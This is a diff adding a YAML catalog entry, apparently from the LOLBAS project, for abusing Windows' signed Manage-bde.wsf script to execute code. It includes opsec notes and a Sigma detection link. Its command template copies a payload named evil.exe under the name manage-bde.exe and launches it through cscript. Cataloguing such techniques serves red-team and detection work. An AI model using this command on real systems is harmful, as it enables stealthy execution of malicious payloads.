@@ -1,0 +1,32 @@
+id: lolbas/manage-bde/execute/1
+type: script
+platform: windows
+name: Manage-bde.wsf
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1216
+opsec:
+  noise: high
+  triggers: Manage-bde.wsf should not be invoked by a standard user under normal situations
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_manage_bde.yml
+commands:
+- template: copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe
+    c:\windows\system32\manage-bde.wsf
+  comment: Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to
+    run the payload file.
+references:
+- https://lolbas-project.github.io/lolbas/Scripts/Manage-bde/
+tags:
+- windows
+- lolbas
